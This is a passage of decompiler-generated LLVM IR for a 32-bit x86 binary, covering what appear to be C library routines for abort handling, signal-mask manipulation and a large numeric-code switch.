  %v1_8052e2e = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_80555f4.53 to i32))
  store i32 %v1_8052e2e, i32* %eax.global-to-local, align 4
  %v0_8052e36.pre = load i8, i8* @global_var_80556d4.54, align 4
  br label %dec_label_pc_8052e36

dec_label_pc_8052e36:                             ; preds = %dec_label_pc_8052dfe, %dec_label_pc_8052e0e
  %v2_8052e36 = phi i32 [ %v2_8052e3623, %dec_label_pc_8052dfe ], [ %v1_8052e2e, %dec_label_pc_8052e0e ]
  %v0_8052e36 = phi i8 [ %v0_8052dfe, %dec_label_pc_8052dfe ], [ %v0_8052e36.pre, %dec_label_pc_8052e0e ]
  %v1_8052e36 = zext i8 %v0_8052e36 to i32
  %v3_8052e36 = and i32 %v2_8052e36, -256
  %v4_8052e36 = or i32 %v1_8052e36, %v3_8052e36
  store i32 %v4_8052e36, i32* %eax.global-to-local, align 4
  %v10_8052e3b = icmp eq i8 %v0_8052e36, 1
  %v1_8052e3d = icmp eq i1 %v10_8052e3b, false
  br i1 %v1_8052e3d, label %dec_label_pc_8052e97, label %dec_label_pc_8052e6a.lr.ph

dec_label_pc_8052e6a.lr.ph:                       ; preds = %dec_label_pc_8052e36
  store i8 2, i8* @global_var_80556d4.54, align 4
  %v2_8052e4e = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8052e4e, i32* %eax.global-to-local, align 4
  %v3_8052e53 = bitcast i32* %stack_var_-272 to i8*
  %v4_8052e53 = call i32 @function_8051a6c(i8* %v3_8052e53, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8052e6a40 = add i32 %v12_8052dc5, 140
  %v5_8052e6a41 = inttoptr i32 %v4_8052e6a40 to i32*
  store i32 -1, i32* %v5_8052e6a41, align 4
  %v0_8052e7242 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e7243 = add i32 %v0_8052e7242, -1
  %v9_8052e7244 = icmp slt i32 %v1_8052e7243, 0
  store i32 %v1_8052e7243, i32* %eax.global-to-local, align 4
  %v1_8052e7345 = icmp eq i1 %v9_8052e7244, false
  br i1 %v1_8052e7345, label %dec_label_pc_8052e6a.dec_label_pc_8052e6a_crit_edge, label %dec_label_pc_8052e75

dec_label_pc_8052e6a.dec_label_pc_8052e6a_crit_edge: ; preds = %dec_label_pc_8052e6a.lr.ph, %dec_label_pc_8052e6a.dec_label_pc_8052e6a_crit_edge
  %v1_8052e7246 = phi i32 [ %v1_8052e72, %dec_label_pc_8052e6a.dec_label_pc_8052e6a_crit_edge ], [ %v1_8052e7243, %dec_label_pc_8052e6a.lr.ph ]
  %v0_8052e6a.pre = load i32, i32* @esp, align 4
  %v2_8052e6a = mul i32 %v1_8052e7246, 4
  %v3_8052e6a = add i32 %v0_8052e6a.pre, 16
  %v4_8052e6a = add i32 %v3_8052e6a, %v2_8052e6a
  %v5_8052e6a = inttoptr i32 %v4_8052e6a to i32*
  store i32 -1, i32* %v5_8052e6a, align 4
  %v0_8052e72 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e72 = add i32 %v0_8052e72, -1
  %v9_8052e72 = icmp slt i32 %v1_8052e72, 0
  store i32 %v1_8052e72, i32* %eax.global-to-local, align 4
  %v1_8052e73 = icmp eq i1 %v9_8052e72, false
  br i1 %v1_8052e73, label %dec_label_pc_8052e6a.dec_label_pc_8052e6a_crit_edge, label %dec_label_pc_8052e75

dec_label_pc_8052e75:                             ; preds = %dec_label_pc_8052e6a.dec_label_pc_8052e6a_crit_edge, %dec_label_pc_8052e6a.lr.ph
  store i32 %v2_8052e4e, i32* %eax.global-to-local, align 4
  %v4_8052e8a = call i32 @function_80535b7(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8052e8a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e0e

dec_label_pc_8052e97:                             ; preds = %dec_label_pc_8052e36
  %v10_8052e97 = icmp eq i8 %v0_8052e36, 2
  %v1_8052e99 = icmp eq i1 %v10_8052e97, false
  br i1 %v1_8052e99, label %dec_label_pc_8052ea3, label %dec_label_pc_8052ea3.thread

dec_label_pc_8052ea3.thread:                      ; preds = %dec_label_pc_8052e97
  store i8 3, i8* @global_var_80556d4.54, align 4
  br label %dec_label_pc_8052eac

dec_label_pc_8052ea3:                             ; preds = %dec_label_pc_8052e97
  %v9_8052ea3 = icmp eq i8 %v0_8052e36, 3
  %v1_8052eaa = icmp eq i1 %v9_8052ea3, false
  br i1 %v1_8052eaa, label %dec_label_pc_8052ebd, label %dec_label_pc_8052eac

dec_label_pc_8052eac:                             ; preds = %dec_label_pc_8052ea3.thread, %dec_label_pc_8052ea3
  store i8 4, i8* @global_var_80556d4.54, align 4
  %v1_8052eb8 = call i32 @function_8053718(i32 127)
  unreachable

dec_label_pc_8052ebd:                             ; preds = %dec_label_pc_8052ea3, %dec_label_pc_8052ebd
  br label %dec_label_pc_8052ebd

; uselistorder directives
  uselistorder i32 %v1_8052e72, { 2, 1, 0 }
  uselistorder i32 %v1_8052dd5, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 3, 4, 5, 10, 11, 12, 13, 14, 15, 16, 18, 17, 2, 0, 1 }
  uselistorder i8 4, { 2, 0, 1 }
  uselistorder i8 3, { 12, 14, 0, 8, 9, 10, 1, 2, 3, 4, 5, 6, 7, 13, 11 }
  uselistorder i8 2, { 16, 22, 17, 1, 18, 2, 3, 4, 5, 6, 19, 20, 7, 8, 10, 11, 12, 0, 21, 9, 13, 14, 15 }
  uselistorder i8* @global_var_80556d4.54, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ebd, { 1, 0 }
  uselistorder label %dec_label_pc_8052eac, { 1, 0 }
  uselistorder label %dec_label_pc_8052e6a.dec_label_pc_8052e6a_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8052e36, { 1, 0 }
  uselistorder label %dec_label_pc_8052dfe, { 1, 0 }
  uselistorder label %dec_label_pc_8052dca.dec_label_pc_8052dca_crit_edge, { 1, 0 }
}

define i32 @function_8053003(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053003:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053016 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053016, i32* @ebx, align 4
  %v2_805301b = call i32 @function_805337a(i32 %v2_8053016, i32 134558583)
  %v1_8053027 = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_805560c.55 to i32))
  %v0_805302c = load i32, i32* @global_var_80556d8.56, align 8
  store i32 %v0_805302c, i32* @eax, align 4
  %v1_8053034 = icmp eq i32 %v0_805302c, 0
  br i1 %v1_8053034, label %dec_label_pc_8053041, label %dec_label_pc_8053038

dec_label_pc_8053038:                             ; preds = %dec_label_pc_8053003
  %v0_805303b = load i32, i32* @esi, align 4
  %v1_805303c = call i32 @unknown_0(i32 %v0_805303b)
  store i32 %v1_805303c, i32* @eax, align 4
  br label %dec_label_pc_8053041

dec_label_pc_8053041:                             ; preds = %dec_label_pc_8053003, %dec_label_pc_8053038
  %v2_8053046 = call i32 @function_805337a(i32 %v2_8053016, i32 1)
  %v0_805304b = call i32 @function_8053338()
  %v0_8053064 = load i32, i32* @esi, align 4
  %v1_8053065 = call i32 @function_8053718(i32 %v0_8053064)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8053718, { 1, 0 }
  uselistorder i32 (i32)* @function_8053377, { 3, 2, 1, 0, 9, 8, 6, 7, 5, 4, 10 }
  uselistorder i32 (i32, i32)* @function_805337a, { 1, 0, 10, 9, 8, 7, 6, 3, 5, 4, 13, 2, 12, 11 }
  uselistorder label %dec_label_pc_8053041, { 1, 0 }
}

define i32 @function_805306a() local_unnamed_addr {
dec_label_pc_805306a:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_805306a = load i32, i32* @ebp, align 4
  %v0_805306b = load i32, i32* @edi, align 4
  %v0_805306c = load i32, i32* @esi, align 4
  %v0_805306d = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %tmp32, i32* %edx.global-to-local, align 4
  %v1_8053080 = icmp eq i32 %tmp32, 0
  %v1_8053082 = icmp eq i1 %v1_8053080, false
  br i1 %v1_8053082, label %dec_label_pc_8053089.lr.ph, label %dec_label_pc_80531e1

dec_label_pc_8053089.lr.ph:                       ; preds = %dec_label_pc_805306a
  %v15_805306e = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805308956 = add i32 %v15_805306e, 416
  %v5_805308957 = inttoptr i32 %v4_805308956 to i32*
  store i32 0, i32* %v5_805308957, align 4
  %v0_805309458 = load i32, i32* %eax.global-to-local, align 4
  %v1_805309459 = add i32 %v0_805309458, -1
  %v9_805309460 = icmp slt i32 %v1_805309459, 0
  store i32 %v1_805309459, i32* %eax.global-to-local, align 4
  %v1_805309561 = icmp eq i1 %v9_805309460, false
  br i1 %v1_805309561, label %dec_label_pc_8053089.dec_label_pc_8053089_crit_edge, label %dec_label_pc_8053097

dec_label_pc_8053089.dec_label_pc_8053089_crit_edge: ; preds = %dec_label_pc_8053089.lr.ph, %dec_label_pc_8053089.dec_label_pc_8053089_crit_edge
  %v1_805309462 = phi i32 [ %v1_8053094, %dec_label_pc_8053089.dec_label_pc_8053089_crit_edge ], [ %v1_805309459, %dec_label_pc_8053089.lr.ph ]
  %v0_8053089.pre = load i32, i32* @esp, align 4
  %v2_8053089 = mul i32 %v1_805309462, 4
  %v3_8053089 = add i32 %v0_8053089.pre, 292
  %v4_8053089 = add i32 %v3_8053089, %v2_8053089
  %v5_8053089 = inttoptr i32 %v4_8053089 to i32*
  store i32 0, i32* %v5_8053089, align 4
  %v0_8053094 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053094 = add i32 %v0_8053094, -1
  %v9_8053094 = icmp slt i32 %v1_8053094, 0
  store i32 %v1_8053094, i32* %eax.global-to-local, align 4
  %v1_8053095 = icmp eq i1 %v9_8053094, false
  br i1 %v1_8053095, label %dec_label_pc_8053089.dec_label_pc_8053089_crit_edge, label %dec_label_pc_8053097

dec_label_pc_8053097:                             ; preds = %dec_label_pc_8053089.dec_label_pc_8053089_crit_edge, %dec_label_pc_8053089.lr.ph
  %v1_8053094.lcssa = phi i32 [ %v1_805309459, %dec_label_pc_8053089.lr.ph ], [ %v1_8053094, %dec_label_pc_8053089.dec_label_pc_8053089_crit_edge ]
  store i32 %tmp32, i32* %stack_var_-24, align 4
  %v2_80530ad = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80530ad, i32* @ebx, align 4
  store i32 %v2_80530ad, i32* %stack_var_-460, align 4
  %v4_80530b5 = call i32 @function_8051e08(i32 %v2_80530ad, i32 17, i32 %v1_8053094.lcssa, i32 %v1_8053094.lcssa)
  store i32 %v4_80530b5, i32* %eax.global-to-local, align 4
  %v2_80530bd = icmp slt i32 %v4_80530b5, 0
  br i1 %v2_80530bd, label %dec_label_pc_80531e5, label %dec_label_pc_80530c5

dec_label_pc_80530c5:                             ; preds = %dec_label_pc_8053097
  %v2_80530c6 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80530c6, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80530d1 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80530d1 = call i32 @function_805174f(i32 0, %_TYPEDEF_sigset_t* %v3_80530d1, i32 %v2_80530c6)
  store i32 %v4_80530d1, i32* %eax.global-to-local, align 4
  %v1_80530d9 = icmp eq i32 %v4_80530d1, 0
  %v1_80530db = icmp eq i1 %v1_80530d9, false
  br i1 %v1_80530db, label %dec_label_pc_80531e5, label %dec_label_pc_80530e1

dec_label_pc_80530e1:                             ; preds = %dec_label_pc_80530c5
  store i32 %v2_80530c6, i32* %stack_var_-460, align 4
  %v4_80530e6 = call i32 @function_8051de4(i32 %v2_80530c6, i32 17, i32 %v4_80530d1, i32 %v4_80530d1)
  store i32 %v4_80530e6, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80530f3 = icmp eq i32 %v4_80530e6, 0
  br i1 %v1_80530f3, label %dec_label_pc_80530fc.lr.ph, label %dec_label_pc_80531af

dec_label_pc_80530fc.lr.ph:                       ; preds = %dec_label_pc_80530e1
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_805308957, align 4
  %v0_805310750 = load i32, i32* %edx.global-to-local, align 4
  %v1_805310751 = add i32 %v0_805310750, -1
  %v9_805310752 = icmp slt i32 %v1_805310751, 0
  store i32 %v1_805310751, i32* %edx.global-to-local, align 4
  %v1_805310853 = icmp eq i1 %v9_805310752, false
  br i1 %v1_805310853, label %dec_label_pc_80530fc.dec_label_pc_80530fc_crit_edge, label %dec_label_pc_805310a

dec_label_pc_80530fc.dec_label_pc_80530fc_crit_edge: ; preds = %dec_label_pc_80530fc.lr.ph, %dec_label_pc_80530fc.dec_label_pc_80530fc_crit_edge
  %v1_805310754 = phi i32 [ %v1_8053107, %dec_label_pc_80530fc.dec_label_pc_80530fc_crit_edge ], [ %v1_805310751, %dec_label_pc_80530fc.lr.ph ]
  %v0_80530fc.pre = load i32, i32* @esp, align 4
  %v2_80530fc = mul i32 %v1_805310754, 4
  %v3_80530fc = add i32 %v0_80530fc.pre, 292
  %v4_80530fc = add i32 %v3_80530fc, %v2_80530fc
  %v5_80530fc = inttoptr i32 %v4_80530fc to i32*
  store i32 0, i32* %v5_80530fc, align 4
  %v0_8053107 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053107 = add i32 %v0_8053107, -1
  %v9_8053107 = icmp slt i32 %v1_8053107, 0
  store i32 %v1_8053107, i32* %edx.global-to-local, align 4
  %v1_8053108 = icmp eq i1 %v9_8053107, false
  br i1 %v1_8053108, label %dec_label_pc_80530fc.dec_label_pc_80530fc_crit_edge, label %dec_label_pc_805310a

dec_label_pc_805310a:                             ; preds = %dec_label_pc_80530fc.dec_label_pc_80530fc_crit_edge, %dec_label_pc_80530fc.lr.ph
  store i32 %v2_80530ad, i32* %eax.global-to-local, align 4
  store i32 %v2_80530ad, i32* %stack_var_-460, align 4
  %v4_8053116 = call i32 @function_8051e08(i32 %v2_80530ad, i32 17, i32 0, i32 0)
  store i32 %v4_8053116, i32* %eax.global-to-local, align 4
  %v2_805311e = icmp slt i32 %v4_8053116, 0
  br i1 %v2_805311e, label %dec_label_pc_80531e5, label %dec_label_pc_8053126

dec_label_pc_8053126:                             ; preds = %dec_label_pc_805310a
  %v2_8053127 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053127, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053130 = call i32 @function_80535b7(i32 17, i32* null, i32 %v2_8053127)
  store i32 %v4_8053130, i32* %eax.global-to-local, align 4
  %v2_8053138 = icmp slt i32 %v4_8053130, 0
  %v1_805313a = icmp eq i1 %v2_8053138, false
  br i1 %v1_805313a, label %dec_label_pc_8053164, label %dec_label_pc_805313c

dec_label_pc_805313c:                             ; preds = %dec_label_pc_8053126
  %v0_805313c = load i32, i32* %stack_var_-460, align 4
  %v1_805313c = call i32 @function_8051a1b(i32 %v0_805313c)
  store i32 %v1_805313c, i32* %eax.global-to-local, align 4
  store i32 %v1_805313c, i32* @ebx, align 4
  %v1_8053143 = inttoptr i32 %v1_805313c to i32*
  %v2_8053143 = load i32, i32* %v1_8053143, align 4
  store i32 %v2_8053143, i32* @esi, align 4
  store i32 %v2_80530c6, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053152 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053152 = call i32 @function_805174f(i32 2, %_TYPEDEF_sigset_t* %v3_8053152, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805315d = load i32, i32* @esi, align 4
  %v1_805315d = load i32, i32* @ebx, align 4
  %v2_805315d = inttoptr i32 %v1_805315d to i32*
  store i32 %v0_805315d, i32* %v2_805315d, align 4
  %v0_80531f2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531e8

dec_label_pc_8053164:                             ; preds = %dec_label_pc_8053126
  %v3_8053164 = load i32, i32* %stack_var_-420, align 4
  %v12_8053164 = icmp eq i32 %v3_8053164, 1
  %v2_8053170 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053170, i32* @ebx, align 4
  %v1_8053177 = icmp eq i1 %v12_8053164, false
  br i1 %v1_8053177, label %dec_label_pc_805319e, label %dec_label_pc_8053179

dec_label_pc_8053179:                             ; preds = %dec_label_pc_8053164
  %v0_8053179 = load i32, i32* @edi, align 4
  store i32 %v2_8053170, i32* %stack_var_-460, align 4
  %v4_805317d = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805317d = call i32 @function_8053b0f(%timespec* %v4_805317d, i32 %v2_8053170, i32 %v0_8053179, i32 %v0_8053179)
  store i32 %v5_805317d, i32* %eax.global-to-local, align 4
  store i32 %v5_805317d, i32* @edi, align 4
  %v1_8053184 = call i32 @function_8051a1b(i32 %v2_8053170)
  store i32 %v1_8053184, i32* %eax.global-to-local, align 4
  store i32 %v1_8053184, i32* @ebx, align 4
  %v1_805318e = inttoptr i32 %v1_8053184 to i32*
  %v2_805318e = load i32, i32* %v1_805318e, align 4
  store i32 %v2_805318e, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053195 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053195 = call i32 @function_805174f(i32 2, %_TYPEDEF_sigset_t* %v3_8053195, i32 0)
  store i32 %v4_8053195, i32* %eax.global-to-local, align 4
  %v0_805319a = load i32, i32* @esi, align 4
  %v1_805319a = load i32, i32* @ebx, align 4
  %v2_805319a = inttoptr i32 %v1_805319a to i32*
  store i32 %v0_805319a, i32* %v2_805319a, align 4
  %v0_80531c4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80531c1

dec_label_pc_805319e:                             ; preds = %dec_label_pc_8053164
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80531a4 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80531a4 = call i32 @function_805174f(i32 2, %_TYPEDEF_sigset_t* %v3_80531a4, i32 0)
  store i32 %v4_80531a4, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80531ba

dec_label_pc_80531af:                             ; preds = %dec_label_pc_80530e1
  %v2_80531b1 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80531b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531ba

dec_label_pc_80531ba:                             ; preds = %dec_label_pc_805319e, %dec_label_pc_80531af
  %storemerge3.pre-phi = phi i32 [ %v2_8053170, %dec_label_pc_805319e ], [ %v2_80531b1, %dec_label_pc_80531af ]
  %v3_80531ba = phi i32 [ %v2_80530c6, %dec_label_pc_805319e ], [ %v4_80530e6, %dec_label_pc_80531af ]
  %v2_80531ba = phi i32 [ 0, %dec_label_pc_805319e ], [ %v4_80530e6, %dec_label_pc_80531af ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_80531ba = bitcast i32* %stack_var_-24 to %timespec*
  %v5_80531ba = call i32 @function_8053b0f(%timespec* %v4_80531ba, i32 %storemerge3.pre-phi, i32 %v2_80531ba, i32 %v3_80531ba)
  store i32 %v5_80531ba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531c1

dec_label_pc_80531c1:                             ; preds = %dec_label_pc_8053179, %dec_label_pc_80531ba
  %v0_80531c4 = phi i32 [ %v0_80531c4.pre, %dec_label_pc_8053179 ], [ %v5_80531ba, %dec_label_pc_80531ba ]
  %v1_80531c4 = icmp eq i32 %v0_80531c4, 0
  br i1 %v1_80531c4, label %dec_label_pc_80531e1, label %dec_label_pc_80531c8

dec_label_pc_80531c8:                             ; preds = %dec_label_pc_80531c1
  %v4_80531d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80531d8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531e8

dec_label_pc_80531e1:                             ; preds = %dec_label_pc_805306a, %dec_label_pc_80531c1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531e8

dec_label_pc_80531e5:                             ; preds = %dec_label_pc_805310a, %dec_label_pc_80530c5, %dec_label_pc_8053097
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531e8

dec_label_pc_80531e8:                             ; preds = %dec_label_pc_80531e1, %dec_label_pc_80531c8, %dec_label_pc_805313c, %dec_label_pc_80531e5
  %v0_80531f2 = phi i32 [ 0, %dec_label_pc_80531e1 ], [ %v4_80531d8, %dec_label_pc_80531c8 ], [ %v0_80531f2.pre, %dec_label_pc_805313c ], [ -1, %dec_label_pc_80531e5 ]
  store i32 %v0_805306d, i32* @ebx, align 4
  store i32 %v0_805306c, i32* @esi, align 4
  store i32 %v0_805306b, i32* @edi, align 4
  store i32 %v0_805306a, i32* @ebp, align 4
  ret i32 %v0_80531f2

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8053184, { 1, 0, 2 }
  uselistorder i32 %v2_8053170, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8053107, { 2, 1, 0 }
  uselistorder i32 %v4_80530e6, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80530c6, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_80530ad, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053094, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 3, 5, 4, 0, 1, 2, 6, 7 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 0, 1, 2, 25 }
  uselistorder i32 (i32, i32*, i32)* @function_80535b7, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8051e08, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_80531e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80531e1, { 1, 0 }
  uselistorder label %dec_label_pc_80531c1, { 1, 0 }
  uselistorder label %dec_label_pc_80531ba, { 1, 0 }
  uselistorder label %dec_label_pc_80530fc.dec_label_pc_80530fc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053089.dec_label_pc_8053089_crit_edge, { 1, 0 }
}

define i32 @function_80531f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_80531f3:
  switch i32 %arg1, label %dec_label_pc_8053212 [
    i32 0, label %dec_label_pc_8053222
    i32 1, label %dec_label_pc_8053307
    i32 2, label %dec_label_pc_805322c
    i32 3, label %dec_label_pc_8053236
    i32 4, label %dec_label_pc_8053240
    i32 5, label %dec_label_pc_80532d6
    i32 6, label %dec_label_pc_8053248
    i32 7, label %dec_label_pc_8053208
    i32 8, label %dec_label_pc_8053208
    i32 9, label %dec_label_pc_8053208
    i32 10, label %dec_label_pc_8053208
    i32 11, label %dec_label_pc_8053208
    i32 12, label %dec_label_pc_8053208
    i32 13, label %dec_label_pc_8053208
    i32 14, label %dec_label_pc_8053208
    i32 15, label %dec_label_pc_8053208
    i32 16, label %dec_label_pc_8053208
    i32 17, label %dec_label_pc_8053208
    i32 18, label %dec_label_pc_8053208
    i32 19, label %dec_label_pc_8053208
    i32 20, label %dec_label_pc_8053208
    i32 21, label %dec_label_pc_8053208
    i32 22, label %dec_label_pc_8053208
    i32 23, label %dec_label_pc_8053307
    i32 24, label %dec_label_pc_8053307
    i32 25, label %dec_label_pc_8053313
    i32 26, label %dec_label_pc_80532e4
    i32 27, label %dec_label_pc_8053307
    i32 28, label %dec_label_pc_805325a
    i32 29, label %dec_label_pc_80532dd
    i32 30, label %dec_label_pc_8053252
    i32 31, label %dec_label_pc_80532f2
    i32 32, label %dec_label_pc_8053307
    i32 33, label %dec_label_pc_8053307
    i32 34, label %dec_label_pc_8053307
    i32 35, label %dec_label_pc_80532eb
    i32 36, label %dec_label_pc_805331a
    i32 37, label %dec_label_pc_8053321
    i32 38, label %dec_label_pc_805331a
    i32 39, label %dec_label_pc_8053264
    i32 40, label %dec_label_pc_8053328
    i32 41, label %dec_label_pc_8053307
    i32 42, label %dec_label_pc_80532f2
    i32 43, label %dec_label_pc_8053321
    i32 44, label %dec_label_pc_805332f
    i32 45, label %dec_label_pc_8053321
    i32 46, label %dec_label_pc_80532dd
    i32 47, label %dec_label_pc_80532dd
    i32 48, label %dec_label_pc_80532dd
    i32 49, label %dec_label_pc_8053307
    i32 50, label %dec_label_pc_8053307
    i32 51, label %dec_label_pc_80532dd
    i32 52, label %dec_label_pc_80532dd
    i32 53, label %dec_label_pc_8053307
    i32 54, label %dec_label_pc_8053307
    i32 55, label %dec_label_pc_8053307
    i32 56, label %dec_label_pc_8053307
    i32 57, label %dec_label_pc_8053307
    i32 58, label %dec_label_pc_8053307
    i32 59, label %dec_label_pc_8053307
    i32 60, label %dec_label_pc_8053307
    i32 61, label %dec_label_pc_8053307
    i32 62, label %dec_label_pc_8053307
    i32 63, label %dec_label_pc_8053307
    i32 64, label %dec_label_pc_8053307
    i32 65, label %dec_label_pc_8053307
    i32 66, label %dec_label_pc_8053307
    i32 67, label %dec_label_pc_8053208
    i32 68, label %dec_label_pc_8053208
    i32 69, label %dec_label_pc_80532eb
    i32 70, label %dec_label_pc_80532eb
    i32 71, label %dec_label_pc_80532eb
    i32 72, label %dec_label_pc_80532f2
    i32 73, label %dec_label_pc_80532f9
    i32 74, label %dec_label_pc_8053300
    i32 75, label %dec_label_pc_805326e
    i32 76, label %dec_label_pc_8053300
    i32 77, label %dec_label_pc_8053208
    i32 78, label %dec_label_pc_8053208
    i32 79, label %dec_label_pc_8053208
    i32 80, label %dec_label_pc_8053208
    i32 81, label %dec_label_pc_8053208
    i32 82, label %dec_label_pc_8053208
    i32 83, label %dec_label_pc_8053208
    i32 84, label %dec_label_pc_8053208
    i32 85, label %dec_label_pc_8053307
    i32 86, label %dec_label_pc_8053307
    i32 87, label %dec_label_pc_80532e4
    i32 88, label %dec_label_pc_8053278
    i32 89, label %dec_label_pc_8053282
    i32 90, label %dec_label_pc_80532f9
    i32 91, label %dec_label_pc_8053208
    i32 92, label %dec_label_pc_8053208
    i32 93, label %dec_label_pc_8053208
    i32 94, label %dec_label_pc_8053208
    i32 95, label %dec_label_pc_80532dd
    i32 96, label %dec_label_pc_8053307
    i32 97, label %dec_label_pc_8053307
    i32 98, label %dec_label_pc_8053208
    i32 99, label %dec_label_pc_8053208
    i32 100, label %dec_label_pc_8053208
    i32 101, label %dec_label_pc_805328c
    i32 102, label %dec_label_pc_80532cf
    i32 103, label %dec_label_pc_805330c
    i32 104, label %dec_label_pc_80532e4
    i32 105, label %dec_label_pc_8053296
    i32 106, label %dec_label_pc_80532f2
    i32 107, label %dec_label_pc_80532f2
    i32 108, label %dec_label_pc_80532d6
    i32 109, label %dec_label_pc_8053313
    i32 110, label %dec_label_pc_805332f
    i32 111, label %dec_label_pc_80532cf
    i32 112, label %dec_label_pc_805330c
    i32 113, label %dec_label_pc_805332f
    i32 114, label %dec_label_pc_80532a0
    i32 115, label %dec_label_pc_8053328
    i32 116, label %dec_label_pc_8053307
    i32 117, label %dec_label_pc_8053307
    i32 118, label %dec_label_pc_80532aa
    i32 119, label %dec_label_pc_80532b4
    i32 120, label %dec_label_pc_8053321
    i32 121, label %dec_label_pc_80532e4
    i32 122, label %dec_label_pc_80532e4
    i32 123, label %dec_label_pc_80532e4
    i32 124, label %dec_label_pc_80532e4
    i32 125, label %dec_label_pc_8053208
    i32 126, label %dec_label_pc_8053208
    i32 127, label %dec_label_pc_8053307
    i32 128, label %dec_label_pc_8053307
    i32 129, label %dec_label_pc_8053208
    i32 130, label %dec_label_pc_8053208
    i32 131, label %dec_label_pc_8053307
    i32 149, label %dec_label_pc_80532bb
  ]

